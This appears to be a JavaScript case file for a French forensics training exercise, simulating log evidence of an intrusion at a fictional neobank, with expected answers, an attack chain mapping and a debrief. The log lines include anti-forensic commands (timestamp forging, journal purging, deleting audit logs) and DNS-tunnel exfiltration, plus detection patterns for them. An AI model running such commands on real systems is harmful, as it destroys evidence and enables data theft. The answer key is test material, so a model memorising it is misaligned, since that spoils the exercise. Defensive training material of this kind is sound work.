/* Open-Forensics — CAS-09. AVERTISSEMENT : contient les réponses attendues. */
(function (root) {
  'use strict';

  root.OpenForensics.cases.push({
    id: 'CAS-09',
    title: 'Journaux effacés et horodatages falsifiés',
    client: 'Neobank Alcyon — établissement de paiement, 140 salariés',
    difficulty: 'difficile',
    estimatedMin: 100,
    tags: ['anti-forensique', 'tunnel DNS', 'infogérance'],

    env: {
      domain: 'ALCYON', dns: 'alcyon.lan', mail: 'neobank-alcyon.example',
      lan: '10.55.7', edge: '198.51.100.120',
      hosts: ['SRV-BASTION-01', 'SRV-APP-11', 'SRV-LOG-01', 'SRV-DC-09', 'SRV-DNS-01', 'PC-OPS-02'],
      users: ['r.vasquez', 'i.haddad', 's.olsen', 'm.faure'],
      admins: ['adm_socle', 'svc_prestataire']
    },

    brief: {
      saisine: 'Jeudi 12 novembre 2026. Lors d\'un audit interne de conformité, un ingénieur relève qu\'un binaire présent sur un serveur applicatif porte une date de modification de 2019, alors que le serveur a été installé en 2024. Personne ne reconnaît ce fichier. L\'audit remonte au responsable sécurité, qui saisit le CERT.',
      perimetre: 'Un bastion d\'administration, quatre serveurs applicatifs Linux, un contrôleur de domaine, un collecteur de journaux central. L\'infogérance est assurée par un prestataire qui accède par réseau privé virtuel avec un compte dédié, bénéficiant d\'une dérogation à l\'authentification forte depuis 2024.',
      collecte: 'Journaux du concentrateur d\'accès distant, journaux locaux des serveurs, journaux du contrôleur de domaine, journaux du collecteur central, journal du résolveur DNS et journal du pare-feu. Période du 28 octobre au 12 novembre. Horodatages en UTC.',
      limites: 'Les journaux locaux de SRV-APP-11 et le journal de sécurité de SRV-DC-09 présentent des interruptions. Le collecteur central reçoit les évènements en flux continu et les conserve indépendamment : c\'est la seule source non altérable de ce dossier. Aucune capture réseau n\'est disponible, seulement des métadonnées.',
      mission: 'Déterminer si les interruptions de journaux sont accidentelles ou volontaires, reconstituer ce qui s\'est passé pendant ces trous, établir si des données ont quitté l\'établissement, et dire depuis quand la compromission dure réellement. La date de première intrusion conditionne l\'étendue de la notification réglementaire.'
    },

    evidence: [
      {
        id: 'PJ-01', source: 'reseau', system: 'Concentrateur d\'accès distant',
        title: 'Journal du réseau privé virtuel',
        note: 'Chaque session porte l\'adresse source publique, le résultat de l\'évaluation de posture et la présence ou non d\'authentification forte.',
        lines: [
          { t: '2026-10-29 08:02:11', m: 'event=tunnel_up user=svc_prestataire src_ip=203.0.113.77 assigned_ip=10.99.1.42 mfa=exempted client=6.2.1 note="adresse habituelle du prestataire"' },
          { t: '2026-10-29 17:41:03', m: 'event=tunnel_down user=svc_prestataire duration_s=34732 bytes_in=44201882 bytes_out=8842011' },
          { t: '2026-11-02 22:39:50', m: 'event=auth_failure user=adm_socle src_ip=192.0.2.207 reason=bad_password attempt=1' },
          { t: '2026-11-02 22:40:22', m: 'event=auth_failure user=r.vasquez src_ip=192.0.2.207 reason=bad_password attempt=1' },
          { t: '2026-11-02 22:41:08', m: 'event=tunnel_up user=svc_prestataire src_ip=192.0.2.207 assigned_ip=10.99.1.51 mfa=exempted client=OpenConnect/9.01 note="client et adresse inhabituels pour ce compte"' },
          { t: '2026-11-03 05:44:12', m: 'event=tunnel_down user=svc_prestataire duration_s=25384 bytes_in=18402118 bytes_out=7204418' },
          { t: '2026-11-05 22:12:40', m: 'event=tunnel_up user=svc_prestataire src_ip=192.0.2.207 assigned_ip=10.99.1.58 mfa=exempted client=OpenConnect/9.01' },
          { t: '2026-11-06 02:31:55', m: 'event=tunnel_down user=svc_prestataire duration_s=15195 bytes_in=9204881 bytes_out=3102554' }
        ],
        noise: [{ family: 'vpn', count: 300, from: '2026-10-28 05:00:00', to: '2026-11-12 19:00:00' }]
      },
      {
        id: 'PJ-02', source: 'journaux', system: 'SRV-LOG-01',
        title: 'Collecteur central de journaux',
        note: 'Reçoit en flux continu les évènements des serveurs et du contrôleur de domaine. Les évènements y sont conservés indépendamment des machines émettrices : ce que l\'on efface localement reste ici.',
        lines: [
          { t: '2026-11-02 22:58:04', m: 'source=SRV-BASTION-01 type=USER_AUTH acct=svc_prestataire exe=/usr/sbin/sshd hostname=10.99.1.51 res=success' },
          { t: '2026-11-02 23:04:41', m: 'source=SRV-BASTION-01 type=SYSCALL syscall=execve exe=/usr/bin/ssh args="svc_prestataire@10.55.7.31" uid=1104 note="rebond vers SRV-APP-11"' },
          { t: '2026-11-02 23:20:17', m: 'source=SRV-APP-11 type=PATH name=/usr/lib/systemd/systemd-timesyncd-helper nametype=CREATE mode=0755 ouid=0 size=1204880 sha256=2cfd836a3cd6cad0521f8ec08645c9f911d9a843c8c93c3eeefd4939e83a4d70' },
          { t: '2026-11-02 23:20:44', m: 'source=SRV-APP-11 type=SYSCALL syscall=utimensat exe=/usr/bin/touch args="-t 201903111402 /usr/lib/systemd/systemd-timesyncd-helper" uid=0' },
          { t: '2026-11-02 23:26:02', m: 'source=SRV-APP-11 type=SYSCALL syscall=execve exe=/bin/cat args="/opt/app/config/database.yml" uid=0 note="fichier contenant les identifiants applicatifs"' },
          { t: '2026-11-03 00:11:38', m: 'source=SRV-APP-11 type=SYSCALL syscall=execve exe=/usr/bin/tar args="-czf /dev/shm/.d.tgz /opt/app/exports /var/lib/app/kyc" uid=0' },
          { t: '2026-11-03 03:12:09', m: 'source=SRV-DC-09 EventCode=1102 message="Le journal d audit a ete efface" Account_Name=svc_prestataire Computer=SRV-DC-09' },
          { t: '2026-11-03 03:12:55', m: 'source=SRV-APP-11 type=SYSCALL syscall=execve exe=/usr/bin/journalctl args="--vacuum-time=1s" uid=0' },
          { t: '2026-11-03 03:13:20', m: 'source=SRV-APP-11 type=SYSCALL syscall=execve exe=/bin/rm args="-f /var/log/auth.log /var/log/audit/audit.log.1" uid=0' },
          { t: '2026-11-03 05:41:02', m: 'source=SRV-APP-11 type=SYSCALL syscall=execve exe=/bin/rm args="-f /dev/shm/.d.tgz" uid=0' },
          { t: '2026-11-05 22:31:14', m: 'source=SRV-APP-11 type=SYSCALL syscall=execve exe=/usr/lib/systemd/systemd-timesyncd-helper args="-c sync.telemetry-node.test -m dns" uid=0' },
          { t: '2026-11-12 09:02:00', m: 'source=SRV-LOG-01 audit=integrite window=2026-11-01/2026-11-12 resultat="aucune suppression detectee sur le collecteur, retention 400 jours"' }
        ],
        noise: [{ family: 'auditd', count: 420, from: '2026-10-28 05:00:00', to: '2026-11-12 19:00:00' }]
      },
      {
        id: 'PJ-03', source: 'journaux', system: 'SRV-APP-11',
        title: 'Journaux locaux du serveur applicatif',
        note: 'Journaux systèmes locaux tels que retrouvés sur la machine. Comparez leur couverture temporelle avec celle du collecteur central.',
        lines: [
          { t: '2026-11-02 22:58:00', m: 'systemd[1]: Started Session 4412 of user svc_prestataire.' },
          { t: '2026-11-02 23:01:14', m: 'CRON[2201]: (root) CMD (/usr/local/bin/rotation-exports.sh)' },
          { t: '2026-11-03 03:12:50', m: 'systemd-journald[402]: Journal stopped' },
          { t: '2026-11-03 06:02:11', m: 'systemd-journald[402]: Runtime Journal started, rotation limit 4.0G' },
          { t: '2026-11-03 06:02:12', m: 'systemd[1]: Started Daily apt download activities.' },
          { t: '2026-11-12 08:44:20', m: 'audit-conformite[8821]: fichier /usr/lib/systemd/systemd-timesyncd-helper mtime=2019-03-11T14:02:00Z incoherent avec date d installation du systeme (2024-06-02) — signalement' }
        ],
        noise: [{ family: 'auditd', count: 260, from: '2026-10-28 05:00:00', to: '2026-11-12 19:00:00', vars: { hosts: ['SRV-APP-11'] } }]
      },
      {
        id: 'PJ-04', source: 'journaux', system: 'SRV-DC-09',
        title: 'Journal de sécurité du contrôleur de domaine',
        note: 'Journal local tel que retrouvé sur la machine, après les faits.',
        lines: [
          { t: '2026-11-03 03:12:09', m: 'EventCode=1102 message="Le journal d audit a ete efface" Account_Name=svc_prestataire Computer=SRV-DC-09 note="premier evenement du journal local : tout ce qui precede a disparu"' },
          { t: '2026-11-03 03:14:41', m: 'EventCode=4624 Logon_Type=3 Account_Name=svc_prestataire Computer=SRV-DC-09 Source_Network_Address=10.55.7.31' },
          { t: '2026-11-03 04:02:18', m: 'EventCode=4688 New_Process_Name=C:\\Windows\\System32\\ntdsutil.exe Account_Name=svc_prestataire Computer=SRV-DC-09 note="tentative interrompue, code de sortie non nul"' },
          { t: '2026-11-03 04:02:44', m: 'EventCode=4625 Logon_Type=3 Account_Name=svc_prestataire Computer=SRV-DC-09 Failure_Reason=Privilege_not_held note="le compte n a pas les droits de sauvegarde de l annuaire"' }
        ],
        noise: [{ family: 'win-security', count: 240, from: '2026-11-03 03:12:09', to: '2026-11-12 19:00:00' }]
      },
      {
        id: 'PJ-05', source: 'reseau', system: 'SRV-DNS-01',
        title: 'Journal du résolveur DNS',
        note: 'Journalise le type d\'enregistrement demandé et la longueur des étiquettes. Un compteur horaire par domaine est produit automatiquement.',
        lines: [
          { t: '2026-11-05 22:34:02', m: 'client=10.55.7.31 query=a7f2c91d8e04bb12.sync.telemetry-node.test type=TXT label_len=16 rcode=NOERROR answer_len=210' },
          { t: '2026-11-05 22:34:02', m: 'client=10.55.7.31 query=b1049ce77af3d820.sync.telemetry-node.test type=TXT label_len=16 rcode=NOERROR answer_len=214' },
          { t: '2026-11-05 22:34:03', m: 'client=10.55.7.31 query=cc82f0a14b9e7731.sync.telemetry-node.test type=TXT label_len=16 rcode=NOERROR answer_len=208' },
          { t: '2026-11-05 23:00:00', m: 'hourly_summary domain=sync.telemetry-node.test client=10.55.7.31 queries=13940 type=TXT avg_answer_len=211 unique_labels=13940' },
          { t: '2026-11-06 00:00:00', m: 'hourly_summary domain=sync.telemetry-node.test client=10.55.7.31 queries=14802 type=TXT avg_answer_len=209 unique_labels=14802' },
          { t: '2026-11-06 01:00:00', m: 'hourly_summary domain=sync.telemetry-node.test client=10.55.7.31 queries=12308 type=TXT avg_answer_len=212 unique_labels=12308' },
          { t: '2026-11-06 02:00:00', m: 'hourly_summary domain=sync.telemetry-node.test client=10.55.7.31 queries=1204 type=TXT avg_answer_len=207 unique_labels=1204 note="fin de la sequence"' },
          { t: '2026-11-06 02:05:00', m: 'domain_first_seen domain=sync.telemetry-node.test first_query=2026-11-05T22:34:02Z registrar_age_days=9' }
        ],
        noise: [{ family: 'dns', count: 400, from: '2026-10-28 05:00:00', to: '2026-11-12 19:00:00' }]
      },
      {
        id: 'PJ-06', source: 'reseau', system: 'Pare-feu périmétrique',
        title: 'Journal du pare-feu et synthèses de volumétrie',
        note: 'Le trafic DNS sortant n\'est pas restreint : les serveurs interrogent directement le résolveur interne, qui relaie vers Internet.',
        lines: [
          { t: '2026-11-03 00:12:04', m: 'src=10.55.7.31 dst=198.51.100.250 dport=443 proto=tcp action=DENY policy=SERVEURS-SORTIE-RESTREINTE note="tentative de sortie HTTPS directe depuis un serveur applicatif"' },
          { t: '2026-11-03 00:12:40', m: 'src=10.55.7.31 dst=198.51.100.250 dport=22 proto=tcp action=DENY policy=SERVEURS-SORTIE-RESTREINTE' },
          { t: '2026-11-06 03:00:00', m: 'egress_summary window=2026-11-05T22:00Z/2026-11-06T03:00Z protocole=dns src=10.55.7.2 total_queries_relayed=42254 total_bytes=9204118 note="volume DNS sortant 38 fois superieur a la moyenne horaire"' },
          { t: '2026-11-12 09:00:00', m: 'egress_summary window=2026-10-28/2026-11-12 protocole=https src=10.55.7.0/24 anomalie=aucune note="aucune sortie web anormale depuis les serveurs"' }
        ],
        noise: [{ family: 'firewall', count: 340, from: '2026-10-28 05:00:00', to: '2026-11-12 19:00:00' }]
      }
    ],

    questions: [
      { id: 'Q1', type: 'text', label: 'Compte utilisé pour l\'intrusion',
        answer: 'svc_prestataire',
        hint: 'Deux tentatives échouent sur d\'autres comptes avant qu\'une session ne s\'ouvre.',
        where: 'PJ-01, tunnel_up du 2 novembre à 22:41:08.',
        why: 'Compte d\'infogérance bénéficiant d\'une dérogation à l\'authentification forte : c\'est la dérogation, plus que le compte, qui est la cause racine.' },

      { id: 'Q2', type: 'ip', label: 'Adresse IP source de l\'intrusion',
        answer: '192.0.2.207',
        hint: 'Comparez l\'adresse des sessions d\'octobre à celle des sessions nocturnes de novembre.',
        where: 'PJ-01, à comparer avec 203.0.113.77 qui est l\'adresse habituelle du prestataire.',
        why: 'Le changement d\'adresse et de logiciel client suffisait à distinguer la session frauduleuse des sessions légitimes du prestataire.' },

      { id: 'Q3', type: 'datetime', label: 'Horodatage de la première connexion frauduleuse (UTC)',
        answer: '2026-11-02 22:41',
        hint: 'Elle suit immédiatement deux échecs sur des comptes différents.',
        where: 'PJ-01, event=tunnel_up.',
        why: 'C\'est la borne initiale de l\'incident, et donc la date à partir de laquelle court la notification réglementaire.' },

      { id: 'Q4', type: 'path', label: 'Chemin du binaire déposé par l\'attaquant',
        answer: '/usr/lib/systemd/systemd-timesyncd-helper',
        hint: 'Le collecteur central journalise sa création, l\'audit de conformité le signale dix jours plus tard.',
        where: 'PJ-02 (type=PATH nametype=CREATE le 2 novembre à 23:20:17) et PJ-03 (signalement du 12 novembre).',
        why: 'Le nom imite un composant systemd légitime et le chemin est celui des bibliothèques système : deux choix destinés à survivre à une inspection rapide.' },

      { id: 'Q5', type: 'datetime', label: 'Date de modification falsifiée portée par ce binaire (UTC)',
        answer: '2019-03-11 14:02',
        hint: 'Une commande touch suit de vingt-sept secondes la création du fichier ; l\'audit de conformité cite la même date.',
        where: 'PJ-02 (touch -t 201903111402) et PJ-03 (mtime=2019-03-11T14:02:00Z).',
        why: 'La falsification d\'horodatage vise à faire passer le fichier pour un composant d\'origine. C\'est précisément l\'incohérence avec la date d\'installation du système, en 2024, qui a déclenché tout le dossier.' },

      { id: 'Q6', type: 'datetime', label: 'Horodatage réel de création de ce binaire (UTC)',
        answer: '2026-11-02 23:20',
        hint: 'Le collecteur central a enregistré l\'évènement de création avant que l\'horodatage local ne soit modifié.',
        where: 'PJ-02, type=PATH nametype=CREATE.',
        why: 'C\'est la démonstration de la falsification : deux dates pour un même fichier, dont l\'une provient d\'une source que l\'attaquant ne contrôlait pas.' },

      { id: 'Q7', type: 'number', label: 'Code de l\'évènement Windows signalant l\'effacement du journal d\'audit',
        answer: '1102',
        hint: 'C\'est le premier évènement encore présent dans le journal local du contrôleur de domaine.',
        where: 'PJ-04, première ligne, et sa copie dans PJ-02.',
        why: 'Cet évènement est écrit par le système au moment même de l\'effacement : il est impossible de l\'éviter, et il date l\'opération à la seconde.' },

      { id: 'Q8', type: 'datetime', label: 'Horodatage de l\'effacement des journaux (UTC)',
        answer: '2026-11-03 03:12',
        hint: 'Trois opérations de nettoyage se suivent en une minute, sur deux systèmes différents.',
        where: 'PJ-02 : 1102 sur le contrôleur à 03:12:09, journalctl --vacuum-time=1s à 03:12:55, suppression de fichiers de journaux à 03:13:20.',
        why: 'Le nettoyage porte sur Windows et sur Linux en moins de deux minutes : l\'attaquant savait exactement quoi effacer, ce qui indique une préparation.' },

      { id: 'Q9', type: 'choice', label: 'Comment sait-on ce qui figurait dans les journaux effacés ?',
        answer: 'Le collecteur central avait déjà reçu les évènements en flux continu',
        options: [
          'Les journaux ont été restaurés depuis une sauvegarde du serveur',
          'Le collecteur central avait déjà reçu les évènements en flux continu',
          'Les évènements ont été reconstitués à partir des horodatages de fichiers',
          'On ne le sait pas : le contenu effacé est définitivement perdu'
        ],
        hint: 'Comparez la couverture temporelle du journal local du serveur applicatif et celle du collecteur pour la même nuit.',
        where: 'PJ-03 s\'interrompt de 03:12:50 à 06:02:11, alors que PJ-02 couvre la nuit entière ; PJ-02 confirme par ailleurs qu\'aucune suppression n\'a eu lieu sur le collecteur.',
        why: 'C\'est la leçon centrale du dossier : l\'effacement local ne vaut que si les journaux ne partent pas ailleurs en temps réel. Une centralisation correctement protégée rend l\'anti-forensique largement inopérante.' },

      { id: 'Q10', type: 'path', label: 'Fichier lu par l\'attaquant pour obtenir des identifiants applicatifs',
        answer: '/opt/app/config/database.yml',
        hint: 'Une commande cat apparaît six minutes après le dépôt du binaire.',
        where: 'PJ-02, 2 novembre à 23:26:02.',
        why: 'Les identifiants en clair dans un fichier de configuration sont le maillon qui transforme un accès système en accès aux données.' },

      { id: 'Q11', type: 'domain', label: 'Domaine utilisé pour le tunnel de sortie',
        answer: 'sync.telemetry-node.test',
        hint: 'Un domaine récent reçoit des dizaines de milliers de requêtes d\'un seul serveur en une nuit.',
        where: 'PJ-05, synthèses horaires, et PJ-02 qui montre le binaire lancé avec ce domaine en argument.',
        why: 'Le nom évoque de la télémétrie et le sous-domaine « sync » banalise l\'usage : c\'est le volume et l\'unicité des étiquettes qui trahissent, pas le nom.' },

      { id: 'Q12', type: 'text', label: 'Type d\'enregistrement DNS employé pour le tunnel',
        answer: 'TXT',
        hint: 'Le résolveur journalise le type de chaque requête ainsi que la longueur de la réponse.',
        where: 'PJ-05, type=TXT avec une longueur de réponse moyenne de 211 octets.',
        why: 'Les enregistrements TXT transportent des données arbitraires : c\'est le canal de choix pour un tunnel, et une réponse de 211 octets en moyenne n\'a rien de normal pour de la résolution de nom.' },

      { id: 'Q13', type: 'number', label: 'Nombre total de requêtes du tunnel sur la nuit du 5 au 6 novembre',
        answer: '42254',
        hint: 'Additionnez les synthèses horaires, ou lisez la synthèse du pare-feu qui donne le total relayé.',
        where: 'PJ-05 (13 940 + 14 802 + 12 308 + 1 204) et PJ-06 (total_queries_relayed=42254).',
        why: 'Faire concorder une somme calculée à la main avec un total journalisé indépendamment est ce qui rend la constatation solide. Avec 211 octets par réponse, l\'ordre de grandeur du volume sorti est d\'environ 9 Mo, cohérent avec l\'archive constituée trois jours plus tôt.' },

      { id: 'Q14', type: 'choice', label: 'Pourquoi l\'attaquant a-t-il utilisé un tunnel DNS plutôt qu\'un transfert HTTPS ?',
        answer: 'Les sorties directes des serveurs vers Internet sont bloquées, le DNS ne l\'est pas',
        options: [
          'Le DNS est plus rapide pour de gros volumes',
          'Les sorties directes des serveurs vers Internet sont bloquées, le DNS ne l\'est pas',
          'Le collecteur de journaux ne journalise pas le DNS',
          'Il n\'y a pas de raison particulière, c\'est un choix arbitraire'
        ],
        hint: 'Regardez ce qui s\'est passé le 3 novembre à 00:12, juste après la constitution de l\'archive.',
        where: 'PJ-06 : deux tentatives de sortie directe en HTTPS puis en SSH, toutes deux refusées par la politique « SERVEURS-SORTIE-RESTREINTE ». Le tunnel DNS n\'apparaît que trois jours plus tard.',
        why: 'La chronologie explique le choix : l\'attaquant a d\'abord essayé le canal le plus simple, s\'est heurté au filtrage, est revenu trois jours après avec un outil adapté. Le filtrage de sortie a donc fonctionné — il manquait seulement la supervision du DNS, qui aurait fermé la dernière porte.' },

      { id: 'Q15', type: 'choice', label: 'La base de l\'annuaire a-t-elle été extraite ?',
        answer: 'Non : la tentative a échoué faute de droits suffisants',
        options: [
          'Oui : l\'outil ntdsutil a été exécuté avec succès',
          'Non : la tentative a échoué faute de droits suffisants',
          'Non : aucune tentative n\'a été faite sur le contrôleur de domaine',
          'Indéterminable : le journal du contrôleur a été effacé'
        ],
        hint: 'Regardez le code de sortie de l\'outil et l\'évènement qui suit immédiatement.',
        where: 'PJ-04 : exécution de ntdsutil.exe avec code de sortie non nul à 04:02:18, suivie d\'un 4625 « Privilege_not_held » à 04:02:44.',
        why: 'Les évènements postérieurs à l\'effacement sont intacts : l\'attaquant a effacé le passé, pas l\'avenir. Répondre « indéterminable » reviendrait à ignorer que le journal local recommence juste après le 1102 et couvre la tentative.' }
    ],

    events: [
      { id: 'EV-01', t: '2026-11-02 22:41', label: 'Connexion au réseau privé virtuel depuis une adresse inhabituelle, sans authentification forte' },
      { id: 'EV-02', t: '2026-11-02 22:58', label: 'Ouverture de session sur le bastion d\'administration' },
      { id: 'EV-03', t: '2026-11-02 23:04', label: 'Rebond en SSH du bastion vers le serveur applicatif' },
      { id: 'EV-04', t: '2026-11-02 23:20', label: 'Dépôt d\'un binaire imitant un composant systemd, puis falsification de sa date' },
      { id: 'EV-05', t: '2026-11-02 23:26', label: 'Lecture du fichier de configuration contenant les identifiants applicatifs' },
      { id: 'EV-06', t: '2026-11-03 00:11', label: 'Constitution d\'une archive des exports et des dossiers de conformité' },
      { id: 'EV-07', t: '2026-11-03 00:12', label: 'Tentatives de sortie directe vers Internet, refusées par le filtrage' },
      { id: 'EV-08', t: '2026-11-03 03:12', label: 'Effacement des journaux sur le contrôleur de domaine et sur le serveur applicatif' },
      { id: 'EV-09', t: '2026-11-03 04:02', label: 'Tentative d\'extraction de la base de l\'annuaire, refusée faute de droits' },
      { id: 'EV-10', t: '2026-11-05 22:34', label: 'Ouverture du tunnel de sortie en requêtes DNS de type TXT' },
      { id: 'EV-11', t: '2026-10-29 08:02', label: 'Session d\'infogérance légitime depuis l\'adresse habituelle du prestataire' },
      { id: 'EV-12', t: '2026-11-12 08:44', label: 'Signalement par l\'audit de conformité d\'une date de fichier incohérente' }
    ],

    chain: [
      { tactic: 'Accès initial', event: 'EV-01', technique: 'T1133', techniqueAlt: ['T1078', 'T1078.002'],
        where: 'PJ-01, session ouverte depuis 192.0.2.207 avec un compte exempté d\'authentification forte.',
        why: 'Deux échecs sur d\'autres comptes précèdent le succès : l\'attaquant disposait d\'une liste d\'identifiants, probablement issue d\'une fuite. La dérogation à l\'authentification forte est ce qui a rendu l\'attaque possible.' },
      { tactic: 'Exécution', event: 'EV-06', technique: 'T1059.004',
        where: 'PJ-02, tar lancé sous root pour constituer /dev/shm/.d.tgz.',
        why: 'L\'usage de /dev/shm — un système de fichiers en mémoire — est délibéré : rien n\'est écrit sur le disque, donc rien ne subsiste après redémarrage.' },
      { tactic: 'Persistance', event: 'NONE', technique: 'NONE',
        where: 'Aucune unité systemd, aucune tâche planifiée, aucune clé de démarrage, aucun compte créé : le binaire déposé n\'est lancé que manuellement, depuis une session ouverte.',
        why: 'Constatation contre-intuitive mais décisive : l\'attaquant n\'a posé aucun mécanisme de persistance. Il n\'en avait pas besoin, puisqu\'il pouvait revenir quand il voulait par le réseau privé virtuel avec un compte valide et exempté d\'authentification forte. Un accès légitime vaut mieux qu\'un implant, et ne déclenche rien.' },
      { tactic: 'Élévation de privilèges', event: 'NONE', technique: 'NONE',
        where: 'Le compte d\'infogérance disposait déjà des droits d\'administration sur les serveurs applicatifs.',
        why: 'La tentative sur le contrôleur de domaine, elle, échoue faute de droits : l\'attaquant était root sur Linux mais n\'a jamais obtenu l\'équivalent sur l\'annuaire.' },
      { tactic: 'Contournement des défenses', event: 'EV-08', technique: 'T1070.001', techniqueAlt: ['T1070.002', 'T1070.006', 'T1036.005'],
        where: 'PJ-02 et PJ-04 : évènement 1102, purge du journal systemd, suppression de fichiers de journaux, falsification d\'horodatage.',
        why: 'Quatre techniques anti-forensiques se combinent. Toutes échouent devant une centralisation des journaux en flux continu — sauf la falsification d\'horodatage, qui est précisément ce qui a fini par éveiller les soupçons.' },
      { tactic: 'Accès aux identifiants', event: 'EV-05', technique: 'T1552.001',
        where: 'PJ-02, lecture de /opt/app/config/database.yml.',
        why: 'Aucun vidage de mémoire, aucun outil spécialisé : un simple cat sur un fichier de configuration a suffi.' },
      { tactic: 'Découverte', event: 'EV-09', technique: 'T1087.002', techniqueAlt: ['T1082'],
        where: 'PJ-04, exécution de ntdsutil.exe suivie d\'un refus de privilège.',
        why: 'La tentative échouée renseigne sur l\'intention : l\'attaquant cherchait l\'annuaire complet, il ne l\'a pas obtenu. Une tentative documentée vaut mieux qu\'un silence.' },
      { tactic: 'Déplacement latéral', event: 'EV-03', technique: 'T1021.004',
        where: 'PJ-02, exécution de ssh depuis le bastion vers 10.55.7.31.',
        why: 'Le bastion a joué exactement son rôle — tout passe par lui — et c\'est ce qui permet de reconstituer le chemin malgré l\'effacement des journaux locaux de la cible.' },
      { tactic: 'Collecte', event: 'EV-06', technique: 'T1005', techniqueAlt: ['T1560.001'],
        where: 'PJ-02, archive des répertoires /opt/app/exports et /var/lib/app/kyc.',
        why: 'Le répertoire « kyc » contient les pièces d\'identité des clients : la nature des données collectées détermine la gravité réglementaire du dossier.' },
      { tactic: 'Commande et contrôle', event: 'EV-10', technique: 'T1071.004',
        where: 'PJ-05, 42 254 requêtes TXT vers un domaine de neuf jours, avec des étiquettes toutes différentes.',
        why: 'Des étiquettes uniques à chaque requête excluent le cache : ce n\'est pas de la résolution de noms, c\'est un canal de données.' },
      { tactic: 'Exfiltration', event: 'EV-10', technique: 'T1048.003', techniqueAlt: ['T1041'],
        where: 'PJ-05 et PJ-06 : 42 254 requêtes pour environ 9 Mo relayés, contre une moyenne horaire 38 fois inférieure.',
        why: 'Le canal de commande et le canal d\'exfiltration sont ici confondus. Le calcul — nombre de requêtes multiplié par la taille moyenne des réponses — donne un ordre de grandeur cohérent avec l\'archive constituée le 3 novembre.' },
      { tactic: 'Impact', event: 'NONE', technique: 'NONE',
        where: 'Aucun chiffrement, aucune destruction de données de production, aucune interruption de service.',
        why: 'L\'effacement des journaux n\'est pas un impact sur l\'activité : c\'est une technique de dissimulation. Les classer ensemble fausserait l\'analyse.' }
    ],

    keyIndicators: ['192.0.2.207', 'svc_prestataire', 'systemd-timesyncd-helper', 'sync.telemetry-node.test', '1102', '2019-03-11', 'database.yml'],

    iocs: [
      { type: 'Adresse IP', value: '192.0.2.207', context: 'Source des trois sessions frauduleuses, client OpenConnect.' },
      { type: 'Chemin', value: '/usr/lib/systemd/systemd-timesyncd-helper', context: 'Binaire de tunnel, horodatage falsifié au 11 mars 2019.' },
      { type: 'Empreinte SHA-256', value: '2cfd836a3cd6cad0521f8ec08645c9f911d9a843c8c93c3eeefd4939e83a4d70', context: 'Binaire déposé sur le serveur applicatif.' },
      { type: 'Domaine', value: 'sync.telemetry-node.test', context: 'Tunnel DNS, requêtes TXT à étiquettes uniques, domaine âgé de neuf jours.' },
      { type: 'Motif de détection', value: 'Plus de 1 000 requêtes TXT par heure vers un même domaine depuis un serveur', context: 'Règle de supervision DNS à mettre en place.' },
      { type: 'Motif de détection', value: 'EventCode 1102 et journalctl --vacuum-time', context: 'Effacement de journaux : à alerter en temps réel depuis le collecteur central.' }
    ],

    debrief: {
      story: 'Le 2 novembre à 22h39, deux tentatives d\'authentification échouent sur le concentrateur d\'accès distant, puis une troisième réussit à 22h41 avec le compte d\'infogérance svc_prestataire, exempté d\'authentification forte, depuis une adresse et un client qui ne sont pas ceux du prestataire. L\'attaquant ouvre une session sur le bastion, rebondit en SSH vers un serveur applicatif, y dépose un binaire nommé systemd-timesyncd-helper puis force sa date de modification au 11 mars 2019. Il lit les identifiants applicatifs en clair dans un fichier de configuration, constitue une archive des exports et des dossiers de conformité dans un système de fichiers en mémoire, et tente de la sortir en HTTPS puis en SSH : le filtrage de sortie des serveurs bloque les deux. À 03h12, il efface le journal d\'audit du contrôleur de domaine, purge le journal systemd du serveur applicatif et supprime deux fichiers de journaux. Il tente ensuite d\'extraire la base de l\'annuaire : refusé, faute de droits. Il revient le 5 novembre à 22h34 et ouvre un tunnel DNS en enregistrements TXT : 42 254 requêtes en quatre heures, environ neuf mégaoctets sortis. Dix jours plus tard, un audit de conformité relève qu\'un fichier daté de 2019 se trouve sur un serveur installé en 2024.',
      lessons: [
        'La centralisation des journaux en flux continu est ce qui sauve ce dossier. Tout ce que l\'attaquant a effacé localement était déjà parti ailleurs. Un collecteur correctement protégé transforme l\'anti-forensique en perte de temps pour l\'attaquant — et en preuve d\'intention pour l\'analyste.',
        'La falsification d\'horodatage a fonctionné contre l\'inspection, mais elle s\'est retournée contre son auteur : c\'est l\'incohérence entre une date de 2019 et une installation de 2024 qui a déclenché l\'ensemble de l\'investigation.',
        'L\'attaquant efface le passé, pas l\'avenir. Tout ce qui suit l\'évènement 1102 est intact, y compris sa tentative ratée sur l\'annuaire. Un journal qui « recommence » à une heure précise n\'est pas un journal vide : c\'est un journal qui date l\'effacement.',
        'Le filtrage de sortie des serveurs a fait son travail, et la chronologie le prouve : deux refus le 3 novembre, puis un retour trois jours plus tard avec un canal adapté. Il manquait la supervision du DNS, seul protocole resté ouvert.',
        'Une dérogation à l\'authentification forte, accordée en 2024 pour la commodité d\'un prestataire, est la cause racine. Elle doit figurer en tête des recommandations, avant toute considération technique.'
      ],
      pitfalls: [
        'Dater l\'intrusion du 12 novembre, jour du signalement, au lieu du 2 novembre : dix jours d\'écart sur une notification réglementaire.',
        'Conclure que le contenu des journaux effacés est perdu, alors que le collecteur central couvre toute la nuit.',
        'Retenir la date de 2019 portée par le fichier : c\'est précisément la falsification, et la vraie date figure dans le collecteur.',
        'Conclure à une extraction de l\'annuaire parce que ntdsutil apparaît dans les journaux : le code de sortie et le refus de privilège qui suit démontrent l\'échec.',
        'Ignorer le tunnel DNS parce que le pare-feu n\'affiche aucune anomalie HTTPS : le canal utilisé est celui qui n\'était pas filtré.'
      ]
    }
  });
})(typeof globalThis !== 'undefined' ? globalThis : this);
